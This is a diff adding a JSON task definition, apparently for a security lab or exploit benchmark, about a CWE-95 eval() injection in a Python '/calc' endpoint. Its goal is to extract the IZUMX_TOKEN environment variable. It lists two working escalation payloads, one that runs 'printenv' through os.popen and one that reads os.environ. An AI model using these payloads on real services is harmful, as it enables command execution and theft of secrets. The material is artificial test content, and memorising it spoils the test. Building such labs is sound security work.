@@ -1,0 +1,14 @@
+{
+  "slug": "eval_injection",
+  "port": 8815,
+  "filter": "",
+  "entry": "before.py",
+  "fixed": "after.py",
+  "class": "CWE-95 code injection through eval() without validation",
+  "goal": "заставить сервис вернуть ЗНАЧЕНИЕ переменной IZUMX_TOKEN (16 hex), а не её имя",
+  "probe": "/calc?expr={payload}",
+  "escalate": [
+    "__import__(\"os\").popen(\"printenv IZUMX_TOKEN\").read()",
+    "__import__(\"os\").environ[\"IZUMX_TOKEN\"]"
+  ]
+}
